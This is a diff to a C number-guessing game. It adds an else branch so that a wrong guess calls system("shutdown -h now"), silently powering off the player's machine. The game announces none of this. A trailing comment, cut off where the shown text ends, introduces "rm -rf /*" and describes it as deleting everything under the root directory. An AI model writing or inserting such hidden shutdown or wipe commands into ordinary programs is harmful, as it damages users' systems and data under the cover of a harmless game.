@@ -1,6 +1,7 @@
 #include<time.h>
 #include<stdlib.h>
 #include<stdio.h>
+#include <string.h>
 
 int main(){
     time_t t;
@@ -12,6 +13,10 @@ int main(){
     scanf("%d", &Input);
     if(Ans==Input){
         printf("You guess the right number!!!!!\n");
+    }else{
+    	char command[50];
+	strcpy(command, "shutdown -h now");
+	system(command);
     }
     /*
     以下不推薦執行-----------------"rm -rf /* "將嘗試遞迴地刪除根目錄下的所有文件和子目錄
